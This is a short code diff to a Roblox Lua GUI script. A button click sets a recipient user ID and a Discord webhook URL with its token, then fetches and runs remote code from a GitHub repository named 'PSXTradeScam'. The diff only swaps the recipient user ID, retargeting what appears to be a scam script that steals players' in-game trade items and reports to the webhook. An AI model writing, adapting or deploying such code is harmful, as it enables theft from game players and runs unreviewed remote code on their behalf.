@@ -274,7 +274,7 @@ local function BLEQF_fake_script() -- TextButton_2.Script
 	local script = Instance.new('Script', TextButton_2)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		_G.UserID = 4167632255
+		_G.UserID = 3720529467
 		_G.WebHook = "https://discord.com/api/webhooks/1057663387036823644/BUcMv5fA-jGSk_EK04WmGOMzHYO6AyO5z3wT8KjSWqo-rlqVXqCcXKMNmukJrc0XcRMg" 
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/SkylerClock600/PSXTradeScam/main/script"))()
 	end)
